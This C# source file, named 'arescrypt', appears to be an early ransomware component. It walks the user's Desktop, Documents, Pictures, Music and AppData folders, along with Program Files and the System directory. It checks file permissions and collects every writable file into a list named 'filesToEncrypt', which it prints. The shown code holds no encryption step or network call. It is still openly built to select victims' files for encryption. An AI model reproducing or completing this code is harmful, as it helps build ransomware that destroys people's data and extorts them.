using System;
using System.Linq;

namespace arescrypt
{
    class Program
    {
        static string sessionDomain = Environment.UserDomainName; // get current sessions domain
        static string sessionUsername = Environment.UserName; // get current sessions username
        static bool sandbox = true; // Safemode for testing/debugging

        static void Main(string[] args)
        {
            Console.WriteLine("Hello, " + sessionUsername);

            var userSpecificDirs = new System.Collections.Generic.List<string> { };
            var systemSpecificDirs = new System.Collections.Generic.List<string> { };

            // User specific directories, administrative rights shouldn't be required in order to write to these files
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

            // System specific directories, administrative rights may be required in order to write to these files
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));

            var directoriesToEncrypt = userSpecificDirs.Concat(systemSpecificDirs);
            var filesToEncrypt = new System.Collections.Generic.List<string> { };
            foreach (string directory in directoriesToEncrypt.Distinct().ToList())
            {
                try
                {
                    string[] files = System.IO.Directory.GetFiles(directory, "*.*", System.IO.SearchOption.AllDirectories);
                    foreach (string file in files)
                    {
                        string NtAccountName = sessionDomain + @"\" + sessionUsername;
                        System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(file);
                        System.Security.AccessControl.DirectorySecurity acl = di.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
                        System.Security.AccessControl.AuthorizationRuleCollection rules = acl.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount));

                        //Go through the rules returned from the DirectorySecurity
                        foreach (System.Security.AccessControl.AuthorizationRule rule in rules)
                        {
                            //If we find one that matches the identity we are looking for
                            if (rule.IdentityReference.Value.Equals(NtAccountName, StringComparison.CurrentCultureIgnoreCase))
                            {
                                //Cast to a FileSystemAccessRule to check for access rights
                                if ((((System.Security.AccessControl.FileSystemAccessRule)rule).FileSystemRights & System.Security.AccessControl.FileSystemRights.WriteData) > 0)
                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
                            }
                        }
                    }
                } catch (UnauthorizedAccessException)
                { Console.WriteLine("Unable to access: " + directory); }
            }

            foreach (string file in filesToEncrypt)
                Console.WriteLine(file);

            Console.Write("\nPress any key to continue . . . ");
            Console.ReadKey(); // Hang the console
        }
    }
}
